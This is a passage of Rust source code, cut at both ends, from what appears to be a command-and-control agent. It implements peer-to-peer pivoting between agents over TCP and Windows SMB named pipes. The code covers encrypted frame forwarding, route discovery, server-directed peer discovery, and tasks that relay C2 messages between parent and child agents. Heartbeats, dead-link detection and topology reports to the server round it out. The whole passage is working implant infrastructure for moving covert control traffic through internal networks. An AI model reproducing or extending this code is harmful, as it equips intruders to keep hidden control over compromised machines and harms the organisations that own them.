        P2pTransport::TcpStream(handle_arc) => {
            let mut handle = handle_arc.lock().await;
            let frame = P2pFrame {
                frame_type: P2pFrameType::DataForward,
                link_id: child_link_id,
                payload_len: 0, // filled by encrypt_write_frame
                payload: data.to_vec(),
            };
            handle.encrypt_write_frame(&frame, &link_key).await?;
        }

        #[cfg(all(windows, feature = "smb-pipe-transport"))]
        P2pTransport::SmbPipe(ref pipe) => {
            let encrypted = encrypt_payload(&link_key, data)?;
            let frame = P2pFrame {
                frame_type: P2pFrameType::DataForward,
                link_id: child_link_id,
                payload_len: encrypted.len() as u32,
                payload: encrypted,
            };
            nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
        }

        _ => {
            return Err(anyhow::anyhow!(
                "unsupported transport for P2P data forwarding"
            ));
        }
    }

    Ok(())
}

} // end mod forwarding_impl

// Re-export forwarding functions at crate-visible scope.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
pub use forwarding_impl::{read_child_data_forward, forward_to_child};

// ══════════════════════════════════════════════════════════════════════════
// Route Discovery — send/recv RouteUpdate, RouteProbe, RouteProbeReply
// ══════════════════════════════════════════════════════════════════════════

/// Default interval between periodic `RouteUpdate` broadcasts (seconds).
pub const ROUTE_UPDATE_INTERVAL_SECS: u64 = 60;

/// Maximum age for a routing table entry before it is considered stale (seconds).
pub const ROUTE_STALE_SECS: u64 = 300; // 5 minutes

/// Minimum route quality before a route is pruned.
pub const ROUTE_MIN_QUALITY: f32 = 0.1;

/// Send a `RouteUpdate` frame on a single link, advertising our routing table.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
async fn send_route_update(link: &mut P2pLink, entries: &[common::p2p_proto::RouteEntry]) -> anyhow::Result<()> {
    let key = link.ecdh_shared_secret;
    let payload = common::p2p_proto::serialize_route_update(entries);
    let encrypted = encrypt_payload(&key, &payload)?;
    let frame = P2pFrame {
        frame_type: P2pFrameType::RouteUpdate,
        link_id: link.link_id,
        payload_len: encrypted.len() as u32,
        payload: encrypted,
    };

    match &mut link.transport {
        #[cfg(feature = "p2p-tcp")]
        P2pTransport::TcpStream(handle_arc) => {
            let mut handle = handle_arc.lock().await;
            handle.write_frame(&frame).await?;
        }
        #[cfg(all(windows, feature = "smb-pipe-transport"))]
        P2pTransport::SmbPipe(ref pipe) => {
            nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
        }
        _ => {
            return Err(anyhow::anyhow!(
                "unsupported transport for RouteUpdate"
            ));
        }
    }
    Ok(())
}

/// Handle an incoming `RouteUpdate` frame: decrypt and merge into routing table.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
pub fn handle_route_update(
    link: &mut P2pMesh,
    link_id: u32,
    encrypted_payload: &[u8],
) -> anyhow::Result<()> {
    let link_ref = link.links.get(&link_id).ok_or_else(|| {
        anyhow::anyhow!("handle_route_update: unknown link_id {link_id:#010X}")
    })?;
    let key = link_ref.ecdh_shared_secret;
    let plaintext = decrypt_payload(&key, encrypted_payload)?;
    let entries = common::p2p_proto::deserialize_route_update(&plaintext)
        .map_err(|e| anyhow::anyhow!("failed to deserialize RouteUpdate: {e}"))?;
    link.merge_route_update(&entries, link_id);
    log::debug!(
        "RouteUpdate from link {:#010X}: {} entries merged (table size: {})",
        link_id,
        entries.len(),
        link.routing_table.len()
    );
    Ok(())
}

/// Send a `RouteProbe` frame on a single link, asking about a destination.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
async fn send_route_probe(link: &mut P2pLink, destination: u32) -> anyhow::Result<()> {
    let key = link.ecdh_shared_secret;
    let payload = common::p2p_proto::serialize_route_probe(destination);
    let encrypted = encrypt_payload(&key, &payload)?;
    let frame = P2pFrame {
        frame_type: P2pFrameType::RouteProbe,
        link_id: link.link_id,
        payload_len: encrypted.len() as u32,
        payload: encrypted,
    };

    match &mut link.transport {
        #[cfg(feature = "p2p-tcp")]
        P2pTransport::TcpStream(handle_arc) => {
            let mut handle = handle_arc.lock().await;
            handle.write_frame(&frame).await?;
        }
        #[cfg(all(windows, feature = "smb-pipe-transport"))]
        P2pTransport::SmbPipe(ref pipe) => {
            nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
        }
        _ => {
            return Err(anyhow::anyhow!(
                "unsupported transport for RouteProbe"
            ));
        }
    }
    Ok(())
}

/// Handle an incoming `RouteProbe` frame: if we have a route, reply with it.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
pub async fn handle_route_probe(
    mesh: &mut P2pMesh,
    link_id: u32,
    encrypted_payload: &[u8],
) -> anyhow::Result<()> {
    let key = mesh.links.get(&link_id)
        .ok_or_else(|| anyhow::anyhow!("handle_route_probe: unknown link {link_id:#010X}"))?
        .ecdh_shared_secret;
    let plaintext = decrypt_payload(&key, encrypted_payload)?;
    let destination = common::p2p_proto::deserialize_route_probe(&plaintext)
        .map_err(|e| anyhow::anyhow!("failed to deserialize RouteProbe: {e}"))?;

    // Check if we have a route or are the destination ourselves.
    let reply_entry = if let Some(entry) = mesh.routing_table.get(&destination) {
        Some(entry.clone())
    } else {
        // We don't have a route — maybe we ARE the destination.
        // Check if any of our link IDs match.
        if mesh.links.contains_key(&destination) {
            Some(common::p2p_proto::RouteEntry {
                destination,
                next_hop: destination,
                hop_count: 0,
                route_quality: 1.0,
            })
        } else {
            None
        }
    };

    if let Some(entry) = reply_entry {
        let reply_payload = common::p2p_proto::serialize_route_probe_reply(&entry);
        let link = mesh.links.get_mut(&link_id).unwrap();
        let encrypted = encrypt_payload(&link.ecdh_shared_secret, &reply_payload)?;
        let frame = P2pFrame {
            frame_type: P2pFrameType::RouteProbeReply,
            link_id,
            payload_len: encrypted.len() as u32,
            payload: encrypted,
        };

        match &mut link.transport {
            #[cfg(feature = "p2p-tcp")]
            P2pTransport::TcpStream(handle_arc) => {
                let mut handle = handle_arc.lock().await;
                handle.write_frame(&frame).await?;
            }
            #[cfg(all(windows, feature = "smb-pipe-transport"))]
            P2pTransport::SmbPipe(ref pipe) => {
                nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
            }
            _ => {}
        }
    }
    Ok(())
}

/// Handle an incoming `RouteProbeReply` frame: merge the route info.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
pub fn handle_route_probe_reply(
    mesh: &mut P2pMesh,
    link_id: u32,
    encrypted_payload: &[u8],
) -> anyhow::Result<()> {
    let key = mesh.links.get(&link_id)
        .ok_or_else(|| anyhow::anyhow!("handle_route_probe_reply: unknown link {link_id:#010X}"))?
        .ecdh_shared_secret;
    let plaintext = decrypt_payload(&key, encrypted_payload)?;
    let entry = common::p2p_proto::deserialize_route_probe_reply(&plaintext)
        .map_err(|e| anyhow::anyhow!("failed to deserialize RouteProbeReply: {e}"))?;

    let hop_count = entry.hop_count.saturating_add(1);
    mesh.update_route(entry.destination, link_id, hop_count, entry.route_quality * 0.95);

    log::debug!(
        "RouteProbeReply from link {:#010X}: dest={:#010X}, hop_count={hop_count}",
        link_id,
        entry.destination
    );
    Ok(())
}

// ══════════════════════════════════════════════════════════════════════════
// Peer Discovery — handle PeerDiscovery frame (0x33)
// ══════════════════════════════════════════════════════════════════════════

/// Handle an incoming `PeerDiscovery` frame from the server.
///
/// The payload contains a list of peer targets to connect to.  The agent
/// will attempt to establish `LinkType::Peer` links to each target.
///
/// Returns the list of `(target_agent_id, result)` pairs.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
pub async fn handle_peer_discovery(
    mesh: &mut P2pMesh,
    encrypted_payload: &[u8],
    mesh_arc: Arc<tokio::sync::Mutex<P2pMesh>>,
    outbound_tx: tokio::sync::mpsc::Sender<common::Message>,
) -> anyhow::Result<Vec<(String, anyhow::Result<u32>)>> {
    // PeerDiscovery comes from the server (parent link), so we decrypt
    // with the parent's key.
    let parent_link_id = mesh.parent_link_id
        .ok_or_else(|| anyhow::anyhow!("handle_peer_discovery: no parent link"))?;
    let key = mesh.links.get(&parent_link_id)
        .ok_or_else(|| anyhow::anyhow!("handle_peer_discovery: parent link missing"))?
        .ecdh_shared_secret;
    let plaintext = decrypt_payload(&key, encrypted_payload)?;

    let targets = common::p2p_proto::PeerTarget::deserialize_list(&plaintext)
        .map_err(|e| anyhow::anyhow!("failed to deserialize PeerDiscovery: {e}"))?;

    let mut results = Vec::new();

    for target in targets {
        // Skip if already connected to this agent.
        let already_connected = mesh.links.values().any(|l| {
            l.state.is_usable() && l.peer_agent_id == target.agent_id
        });
        if already_connected {
            log::info!(
                "PeerDiscovery: already connected to '{}', skipping",
                target.agent_id
            );
            results.push((target.agent_id, Err(anyhow::anyhow!("already connected"))));
            continue;
        }

        // Skip if we can't accept more peers.
        if !mesh.can_accept_peer() {
            log::warn!(
                "PeerDiscovery: at peer capacity ({}/{}), skipping '{}'",
                mesh.peer_link_ids.len(),
                mesh.max_peers,
                target.agent_id
            );
            results.push((target.agent_id, Err(anyhow::anyhow!("peer capacity full"))));
            continue;
        }

        let link_id: u32 = rand::Rng::gen_range(&mut rand::thread_rng(), 0x0001_0000..=0xFFFF_FFFF);
        let agent_id = target.agent_id.clone();

        let connect_result = match target.transport.to_lowercase().as_str() {
            "tcp" => {
                #[cfg(feature = "p2p-tcp")]
                {
                    let (host, port) = parse_host_port(&target.address)?;
                    match tcp_transport::connect(&host, port, &mesh.agent_id, link_id).await {
                        Ok(tcp_transport::ConnectResult::Connected(mut link)) => {
                            // Override the link type to Peer.
                            link.link_type = LinkType::Peer;
                            if link.state != LinkState::Connected {
                                link.transition(LinkState::Connected)
                                    .map_err(|e| anyhow::anyhow!("{e}"))?;
                            }
                            let lid = link.link_id;
                            mesh.insert_link(link);
                            spawn_child_relay(lid, mesh_arc.clone(), outbound_tx.clone());
                            log::info!(
                                "PeerDiscovery: connected to '{}' via TCP peer link {:#010X}",
                                agent_id, lid
                            );
                            Ok(lid)
                        }
                        Ok(tcp_transport::ConnectResult::Rejected { reason, description }) => {
                            Err(anyhow::anyhow!(
                                "peer '{}' rejected link: {description} (reason={reason:#04X})",
                                agent_id
                            ))
                        }
                        Err(e) => Err(anyhow::anyhow!(
                            "peer '{}' TCP connect failed: {e}",
                            agent_id
                        )),
                    }
                }
                #[cfg(not(feature = "p2p-tcp"))]
                {
                    let _ = link_id;
                    Err(anyhow::anyhow!("TCP P2P not compiled in"))
                }
            }
            "smb" => {
                #[cfg(all(windows, feature = "smb-pipe-transport"))]
                {
                    let addr_owned = target.address.clone();
                    let my_id = mesh.agent_id.clone();
                    let result = tokio::task::spawn_blocking(move || {
                        nt_pipe_server::connect(&addr_owned, &my_id, link_id)
                    })
                    .await
                    .map_err(|e| anyhow::anyhow!("p2p-pipe connect task panicked: {e}"))??;

                    match result {
                        nt_pipe_server::ConnectResult::Connected(mut link) => {
                            link.link_type = LinkType::Peer;
                            if link.state != LinkState::Connected {
                                link.transition(LinkState::Connected)
                                    .map_err(|e| anyhow::anyhow!("{e}"))?;
                            }
                            let lid = link.link_id;
                            mesh.insert_link(link);
                            spawn_child_relay(lid, mesh_arc.clone(), outbound_tx.clone());
                            log::info!(
                                "PeerDiscovery: connected to '{}' via SMB peer link {:#010X}",
                                agent_id, lid
                            );
                            Ok(lid)
                        }
                        nt_pipe_server::ConnectResult::Rejected { reason, description } => {
                            Err(anyhow::anyhow!(
                                "peer '{}' rejected SMB link: {description} (reason={reason:#04X})",
                                agent_id
                            ))
                        }
                    }
                }
                #[cfg(not(all(windows, feature = "smb-pipe-transport")))]
                {
                    let _ = link_id;
                    Err(anyhow::anyhow!("SMB P2P not compiled in"))
                }
            }
            other => Err(anyhow::anyhow!(
                "unknown transport '{other}' in PeerDiscovery target"
            )),
        };

        results.push((agent_id, connect_result));
    }

    Ok(results)
}

/// Spawn a background tokio task that continuously reads `DataForward` frames
/// from a single child link and relays them to the server via the outbound
/// channel as `Message::P2pForward`.
///
/// The task exits cleanly when the read fails (broken link, EOF, etc.) or
/// when the outbound channel is closed.
///
/// # Arguments
///
/// * `link_id` — The child's link ID (moved into the spawned task for logging).
/// * `mesh` — `Arc<Mutex<P2pMesh>>` so the task can access the link. The mesh
///   must already contain `link_id`.
/// * `outbound_tx` — Clone of the outbound message sender.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
pub fn spawn_child_relay(
    link_id: u32,
    mesh: Arc<tokio::sync::Mutex<P2pMesh>>,
    outbound_tx: tokio::sync::mpsc::Sender<common::Message>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        loop {
            // Lock the mesh, grab the link, read one frame.
            let read_result = {
                let mut mesh_guard = mesh.lock().await;
                let link = match mesh_guard.links.get_mut(&link_id) {
                    Some(l) => l,
                    None => {
                        log::warn!(
                            "child relay task: link {:#010X} removed from mesh, exiting",
                            link_id
                        );
                        return;
                    }
                };
                read_child_data_forward(link).await
            };

            match read_result {
                Ok((child_lid, plaintext)) => {
                    log::debug!(
                        "child relay: read {} bytes from child {:#010X}",
                        plaintext.len(),
                        child_lid
                    );
                    let msg = common::Message::P2pForward {
                        child_link_id: child_lid,
                        data: plaintext,
                    };
                    if outbound_tx.send(msg).await.is_err() {
                        log::warn!(
                            "child relay task: outbound channel closed for link {:#010X}, exiting",
                            link_id
                        );
                        return;
                    }
                }
                Err(e) => {
                    log::warn!(
                        "child relay task: read error on link {:#010X}: {} — exiting",
                        link_id,
                        e
                    );
                    // Optionally mark the link as dead in the mesh.
                    let mut mesh_guard = mesh.lock().await;
                    if let Some(link) = mesh_guard.links.get_mut(&link_id) {
                        link.state = LinkState::Dead;
                    }
                    return;
                }
            }
        }
    })
}

/// Spawn a background task that reads DataForward frames from the parent
/// link and injects the decrypted C2 messages into the main loop via an
/// internal channel.
///
/// The parent reader is the reverse of [`spawn_child_relay`]: instead of
/// relaying child data **up** to the server, it relays parent data **down**
/// into this agent's command-processing pipeline.
///
/// # Arguments
///
/// * `mesh` — Shared P2P mesh (must already contain the parent link).
/// * `inbound_tx` — Channel to send decrypted C2 messages into the main loop.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
pub fn spawn_parent_reader(
    mesh: Arc<tokio::sync::Mutex<P2pMesh>>,
    inbound_tx: tokio::sync::mpsc::Sender<common::Message>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        loop {
            // Find the parent link ID.
            let parent_link_id = {
                let mesh_guard = mesh.lock().await;
                match mesh_guard.parent_link_id {
                    Some(id) => id,
                    None => {
                        log::info!(
                            "parent reader: no parent link in mesh, exiting"
                        );
                        return;
                    }
                }
            };

            // Read one DataForward frame from the parent.
            let read_result = {
                let mut mesh_guard = mesh.lock().await;
                let link = match mesh_guard.links.get_mut(&parent_link_id) {
                    Some(l) if l.state.is_usable() => l,
                    Some(l) => {
                        log::warn!(
                            "parent reader: parent link {:#010X} is {:?}, exiting",
                            parent_link_id, l.state
                        );
                        return;
                    }
                    None => {
                        log::warn!(
                            "parent reader: parent link {:#010X} removed, exiting",
                            parent_link_id
                        );
                        return;
                    }
                };
                read_child_data_forward(link).await
            };

            match read_result {
                Ok((_link_id, plaintext)) => {
                    // The plaintext is a C2 message from the server,
                    // routed through the parent.  Deserialize with bincode
                    // (the same codec used by the C2 transport) and inject
                    // into the main loop.
                    match bincode::deserialize::<common::Message>(&plaintext) {
                        Ok(msg) => {
                            log::debug!(
                                "parent reader: decoded {}-byte message from parent",
                                plaintext.len()
                            );
                            if inbound_tx.send(msg).await.is_err() {
                                log::warn!(
                                    "parent reader: inbound channel closed, exiting"
                                );
                                return;
                            }
                        }
                        Err(e) => {
                            // If we can't parse it as a Message, it might be
                            // a raw C2 payload or routing blob for a grandchild.
                            // Try parsing as a routing blob.
                            if let Ok((child_link_id, payload)) =
                                parse_p2p_routing_blob(&plaintext)
                            {
                                let msg = common::Message::P2pToChild {
                                    child_link_id,
                                    data: payload,
                                };
                                if inbound_tx.send(msg).await.is_err() {
                                    log::warn!(
                                        "parent reader: inbound channel closed, exiting"
                                    );
                                    return;
                                }
                            } else {
                                log::warn!(
                                    "parent reader: failed to decode {}-byte payload from parent: {}",
                                    plaintext.len(),
                                    e
                                );
                            }
                        }
                    }
                }
                Err(e) => {
                    log::warn!(
                        "parent reader: read error on parent link {:#010X}: {} — exiting",
                        parent_link_id,
                        e
                    );
                    let mut mesh_guard = mesh.lock().await;
                    if let Some(link) = mesh_guard.links.get_mut(&parent_link_id) {
                        link.state = LinkState::Dead;
                    }
                    return;
                }
            }
        }
    })
}

/// Build a routing-prefixed blob for P2P forwarded data.
///
/// Format: `[child_link_id: u32 LE][payload_len: u32 LE][payload: bytes]`
///
/// Always available — does not depend on any transport feature.
pub fn build_p2p_routing_blob(child_link_id: u32, payload: &[u8]) -> Vec<u8> {
    let mut blob = Vec::with_capacity(4 + 4 + payload.len());
    blob.extend_from_slice(&child_link_id.to_le_bytes());
    blob.extend_from_slice(&(payload.len() as u32).to_le_bytes());
    blob.extend_from_slice(payload);
    blob
}

/// Parse a routing-prefixed blob from the server.
///
/// Returns `(child_link_id, data)` where `data` is the C2 payload
/// intended for the child. Always available.
pub fn parse_p2p_routing_blob(blob: &[u8]) -> anyhow::Result<(u32, Vec<u8>)> {
    if blob.len() < 8 {
        return Err(anyhow::anyhow!(
            "P2P routing blob too short: {} < 8",
            blob.len()
        ));
    }
    let child_link_id = u32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]);
    let payload_len = u32::from_le_bytes([blob[4], blob[5], blob[6], blob[7]]) as usize;
    if blob.len() < 8 + payload_len {
        return Err(anyhow::anyhow!(
            "P2P routing blob truncated: have {} bytes, need {}",
            blob.len(),
            8 + payload_len
        ));
    }
    let data = blob[8..8 + payload_len].to_vec();
    Ok((child_link_id, data))
}

// ══════════════════════════════════════════════════════════════════════════
// P2P Heartbeat and Dead-Link Detection
// ══════════════════════════════════════════════════════════════════════════

/// Default P2P heartbeat interval in seconds.
pub const DEFAULT_P2P_HEARTBEAT_SECS: u64 = 30;

/// Default TopologyReport interval in seconds.
pub const TOPOLOGY_REPORT_INTERVAL_SECS: u64 = 60;

/// Build a `LinkHeartbeat` frame payload: 8-byte millisecond timestamp
/// (little-endian).
fn heartbeat_payload() -> Vec<u8> {
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as u64;
    ts.to_le_bytes().to_vec()
}

/// Send a `LinkHeartbeat` frame on a single link, encrypting the payload
/// with the per-link key.
///
/// Handles both TCP and SMB transports.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
async fn send_heartbeat(link: &mut P2pLink) -> anyhow::Result<()> {
    let key = link.ecdh_shared_secret;
    let payload = heartbeat_payload();
    let encrypted = encrypt_payload(&key, &payload)?;
    let frame = P2pFrame {
        frame_type: P2pFrameType::LinkHeartbeat,
        link_id: link.link_id,
        payload_len: encrypted.len() as u32,
        payload: encrypted,
    };

    match &mut link.transport {
        #[cfg(feature = "p2p-tcp")]
        P2pTransport::TcpStream(handle_arc) => {
            let mut handle = handle_arc.lock().await;
            handle.write_frame(&frame).await?;
        }

        #[cfg(all(windows, feature = "smb-pipe-transport"))]
        P2pTransport::SmbPipe(ref pipe) => {
            nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
        }

        _ => {
            return Err(anyhow::anyhow!(
                "unsupported transport for P2P heartbeat"
            ));
        }
    }

    Ok(())
}

/// Send a `LinkDisconnect` frame to the peer on the given link (best-effort).
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
async fn send_disconnect(link: &mut P2pLink) -> anyhow::Result<()> {
    let frame = P2pFrame {
        frame_type: P2pFrameType::LinkDisconnect,
        link_id: link.link_id,
        payload_len: 0,
        payload: Vec::new(),
    };

    match &mut link.transport {
        #[cfg(feature = "p2p-tcp")]
        P2pTransport::TcpStream(handle_arc) => {
            let mut handle = handle_arc.lock().await;
            handle.write_frame(&frame).await?;
        }

        #[cfg(all(windows, feature = "smb-pipe-transport"))]
        P2pTransport::SmbPipe(ref pipe) => {
            nt_pipe_server::NtPipeHandle::write_frame(pipe, &frame)?;
        }

        _ => {
            return Err(anyhow::anyhow!(
                "unsupported transport for P2P disconnect"
            ));
        }
    }

    Ok(())
}

/// Parse a `host:port` address string, returning `(host, port)`.
///
/// If no port is specified, defaults to `9050`.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
fn parse_host_port(addr: &str) -> anyhow::Result<(String, u16)> {
    if let Some(idx) = addr.rfind(':') {
        let host = addr[..idx].to_string();
        let port: u16 = addr[idx + 1..]
            .parse()
            .map_err(|_| anyhow::anyhow!("invalid port in address: {:?}", addr))?;
        Ok((host, port))
    } else {
        Ok((addr.to_string(), 9050))
    }
}

/// Spawn the P2P heartbeat timer task.
///
/// This task runs on a separate timer and:
/// 1. Sends `LinkHeartbeat` frames to all connected links every
///    `heartbeat_interval`.
/// 2. Checks for dead links (no heartbeat or data received within
///    `3 * heartbeat_interval`).
/// 3. Generates periodic `P2pTopologyReport` messages to the server.
///
/// The task communicates with the agent through the mesh `Arc<Mutex<P2pMesh>>`
/// and the outbound channel.  It does **not** touch the C2 transport directly.
///
/// # Arguments
///
/// * `mesh` — Shared P2P mesh state.
/// * `outbound_tx` — Channel to send `Message::P2pTopologyReport` and
///   `Message::P2pForward` (for buffered data from a dead parent).
/// * `heartbeat_interval` — Duration between heartbeat sends.
#[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
pub fn spawn_heartbeat_task(
    mesh: Arc<tokio::sync::Mutex<P2pMesh>>,
    outbound_tx: tokio::sync::mpsc::Sender<common::Message>,
    heartbeat_interval: std::time::Duration,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        let dead_timeout = heartbeat_interval * 3;
        let mut topo_tick = tokio::time::interval(
            std::time::Duration::from_secs(TOPOLOGY_REPORT_INTERVAL_SECS),
        );
        let mut route_tick = tokio::time::interval(
            std::time::Duration::from_secs(ROUTE_UPDATE_INTERVAL_SECS),
        );
        // Stagger the first topology report so it doesn't collide with
        // the first heartbeat.
        topo_tick.tick().await;
        route_tick.tick().await;

        loop {
            tokio::select! {
                _ = tokio::time::sleep(heartbeat_interval) => {
                    // ── Send heartbeats and detect dead links ──────────
                    let dead_links = {
                        let mut mesh_guard = mesh.lock().await;

                        // Send heartbeats to all connected links.
                        let mut send_errors: Vec<u32> = Vec::new();
                        let link_ids: Vec<u32> = mesh_guard.links.keys().copied().collect();

                        for lid in &link_ids {
                            if let Some(link) = mesh_guard.links.get_mut(lid) {
                                if link.state.is_usable() {
                                    if let Err(e) = send_heartbeat(link).await {
                                        log::warn!(
                                            "P2P heartbeat send failed on link {:#010X}: {}",
                                            lid, e
                                        );
                                        send_errors.push(*lid);
                                    }
                                }
                            }
                        }

                        // Links where send failed → mark dead.
                        for lid in &send_errors {
                            if let Some(link) = mesh_guard.links.get_mut(lid) {
                                log::warn!(
                                    "P2P link {:#010X} marked dead (heartbeat send failed)",
                                    lid
                                );
                                let _ = link.transition(LinkState::Dead);
                            }
                        }

                        // Check for timed-out links.
                        let now = Instant::now();
                        let mut dead: Vec<u32> = Vec::new();
                        for (&lid, link) in &mesh_guard.links {
                            if link.state.is_usable()
                                && now.duration_since(link.last_heartbeat) > dead_timeout
                            {
                                dead.push(lid);
                            }
                        }

                        // Transition timed-out links to Dead.
                        for lid in &dead {
                            if let Some(link) = mesh_guard.links.get_mut(lid) {
                                log::warn!(
                                    "P2P link {:#010X} timed out (no activity for >{:?}), marking dead",
                                    lid, dead_timeout
                                );
                                let _ = link.transition(LinkState::Dead);
                            }
                        }

                        // Collect all dead links (send-failed + timed-out).
                        let mut all_dead = send_errors;
                        all_dead.extend(dead);
                        all_dead
                    };

                    // ── Handle dead links outside the mesh lock ────────
                    for dead_lid in &dead_links {
                        let mut mesh_guard = mesh.lock().await;

                        // Remove any routes through this dead link.
                        mesh_guard.remove_routes_via(*dead_lid);

                        // Determine if this was a parent, child, or peer link.
                        let is_parent = mesh_guard.parent_link_id == Some(*dead_lid);
                        let is_peer = mesh_guard.peer_link_ids.contains(dead_lid);

                        if let Some(dead_link) = mesh_guard.remove_link(*dead_lid) {
                            if is_parent {
                                // Child side: parent link died.
                                // The child does NOT reconnect on its own.
                                // It waits for the server to issue a new LinkTo
                                // command with an alternative parent.
                                // pending_forwards is preserved inside the link
                                // for later flushing if re-linked — but since
                                // remove_link consumes the link, we store the
                                // pending data as a warning log for now.
                                if !dead_link.pending_forwards.is_empty() {
                                    log::warn!(
                                        "P2P parent link {:#010X} died with {} buffered forwards; \
                                         waiting for server re-link",
                                        dead_lid,
                                        dead_link.pending_forwards.len()
                                    );
                                }
                                log::info!(
                                    "P2P parent link {:#010X} removed; awaiting server re-link",
                                    dead_lid
                                );
                            } else {
                                // Parent side: child or peer link died.
                                let link_kind = if is_peer { "peer" } else { "child" };
                                log::info!(
                                    "P2P {} link {:#010X} (agent={}) removed",
                                    link_kind,
                                    dead_lid,
                                    dead_link.peer_agent_id
                                );
                                // TopologyReport will be generated on the next
                                // topology tick, automatically reflecting the
                                // removed link.
                            }
                        }
                    }
                }

                _ = topo_tick.tick() => {
                    // ── Generate TopologyReport ────────────────────────
                    let report = {
                        let mesh_guard = mesh.lock().await;
                        let children: Vec<common::P2pChildInfo> = mesh_guard
                            .connected_children()
                            .map(|c| common::P2pChildInfo {
                                link_id: c.link_id,
                                agent_id: c.peer_agent_id.clone(),
                            })
                            .collect();
                        common::Message::P2pTopologyReport {
                            agent_id: mesh_guard.agent_id.clone(),
                            children,
                        }
                    };

                    if let Err(e) = outbound_tx.send(report).await {
                        log::warn!(
                            "P2P topology report: outbound channel closed: {}",
                            e
                        );
                        return; // channel closed, agent is shutting down
                    }
                }

                _ = route_tick.tick() => {
                    // ── Broadcast RouteUpdate to all connected links ────
                    let mut mesh_guard = mesh.lock().await;

                    // Only broadcast in Hybrid or Mesh mode.
                    if mesh_guard.mesh_mode == MeshMode::Tree {
                        continue;
                    }

                    let snapshot = mesh_guard.routing_table_snapshot();
                    if snapshot.is_empty() {
                        continue;
                    }

                    let link_ids: Vec<u32> = mesh_guard.links.keys().copied().collect();
                    for lid in &link_ids {
                        if let Some(link) = mesh_guard.links.get_mut(lid) {
                            if link.state.is_usable() {
                                if let Err(e) = send_route_update(link, &snapshot).await {
                                    log::warn!(
                                        "RouteUpdate send failed on link {:#010X}: {}",
                                        lid, e
                                    );
                                }
                            }
                        }
                    }

                    // Prune low-quality routes.
                    mesh_guard.routing_table.retain(|_, entry| {
                        entry.route_quality >= ROUTE_MIN_QUALITY
                    });
                }
            }
        }
    })
}

/// Handle an incoming `LinkHeartbeat` frame on a link.
///
/// Decrypts the payload, records the heartbeat timestamp, and returns
/// the peer's timestamp (milliseconds since epoch).
pub fn handle_heartbeat(link: &mut P2pLink, encrypted_payload: &[u8]) -> anyhow::Result<u64> {
    let key = link.ecdh_shared_secret;
    let plaintext = decrypt_payload(&key, encrypted_payload)?;
    if plaintext.len() < 8 {
        return Err(anyhow::anyhow!(
            "heartbeat payload too short: {} < 8",
            plaintext.len()
        ));
    }
    let peer_ts = u64::from_le_bytes([
        plaintext[0], plaintext[1], plaintext[2], plaintext[3],
        plaintext[4], plaintext[5], plaintext[6], plaintext[7],
    ]);
    link.record_heartbeat();
    Ok(peer_ts)
}

// ══════════════════════════════════════════════════════════════════════════
// TCP P2P Relay (cross-platform, feature-gated)
// ══════════════════════════════════════════════════════════════════════════

#[cfg(feature = "p2p-tcp")]
pub mod tcp_transport {
    use super::*;
    use anyhow::{anyhow, Result};
    use log::{info, warn};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpStream;
    use x25519_dalek::{EphemeralSecret, PublicKey};

    // ── TCP P2P handle ───────────────────────────────────────────────────

    /// Async wrapper around a `tokio::net::TcpStream` for P2P frame I/O.
    ///
    /// Uses length-prefix framing: `[total_frame_len: u32 LE][P2pFrame bytes]`.
    /// This handles TCP's stream-oriented delivery so frames are not
    /// concatenated or split unexpectedly.
    pub struct TcpP2pHandle {
        stream: TcpStream,
    }

    impl std::fmt::Debug for TcpP2pHandle {
        fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
            f.debug_struct("TcpP2pHandle")
                .field("peer_addr", &self.stream.peer_addr().ok())
                .finish()
        }
    }

    impl TcpP2pHandle {
        /// Create a new handle from an established TCP stream.
        pub fn new(stream: TcpStream) -> Self {
            Self { stream }
        }

        /// Return a reference to the inner TCP stream.
        pub fn stream(&self) -> &TcpStream {
            &self.stream
        }

        /// Read a complete `P2pFrame` from the TCP stream.
        ///
        /// Wire format: `[frame_len: u32 LE][P2pFrame bytes]`
        pub async fn read_frame(&mut self) -> Result<P2pFrame> {
            // 1. Read the 4-byte length prefix.
            let mut len_buf = [0u8; 4];
            self.stream.read_exact(&mut len_buf).await?;
            let frame_len = u32::from_le_bytes(len_buf) as usize;

            if frame_len < HEADER_SIZE {
                return Err(anyhow!(
                    "p2p-tcp: frame too short: {frame_len} < {HEADER_SIZE}"
                ));
            }
            if frame_len > TCP_MAX_FRAME_BYTES {
                return Err(anyhow!(
                    "p2p-tcp: frame too large: {frame_len} > {TCP_MAX_FRAME_BYTES}"
                ));
            }

            // 2. Read the frame bytes.
            let mut frame_buf = vec![0u8; frame_len];
            self.stream.read_exact(&mut frame_buf).await?;

            // 3. Parse the P2pFrame.
            let header = &frame_buf[..HEADER_SIZE];
